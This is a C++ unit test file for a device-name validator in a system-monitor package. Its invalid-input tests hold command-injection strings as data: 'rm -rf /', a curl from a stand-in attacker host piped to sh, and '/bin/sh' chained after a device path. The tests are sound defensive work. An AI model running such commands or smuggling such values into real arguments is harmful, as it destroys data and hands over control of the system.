// Copyright 2026 Tier IV, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "system_monitor/hdd_reader/hdd_reader.hpp"

#include <gtest/gtest.h>

#include <string>

TEST(HddReaderTest, ValidDevicePath)
{
  EXPECT_TRUE(validate_unmount_device_name("/dev/sda1"));
  EXPECT_TRUE(validate_unmount_device_name("/dev/nvme0n1p2"));
  EXPECT_TRUE(validate_unmount_device_name("/dev/mmcblk0p1"));
  EXPECT_TRUE(validate_unmount_device_name("/dev/mapper/cryptroot"));
  EXPECT_TRUE(validate_unmount_device_name("/dev/dm-0"));
}

TEST(HddReaderTest, InvalidDevicePath)
{
  EXPECT_FALSE(validate_unmount_device_name("/dev/sda1; rm -rf /"));
  EXPECT_FALSE(validate_unmount_device_name("/dev/null; curl http://attacker/x | sh #"));
  EXPECT_FALSE(validate_unmount_device_name("/dev/sda1 && /bin/sh"));
  EXPECT_FALSE(validate_unmount_device_name("/dev/sda1|cat"));
  EXPECT_FALSE(validate_unmount_device_name("/tmp/evil"));
  EXPECT_FALSE(validate_unmount_device_name("/dev/sda1\n/bin/sh"));
}
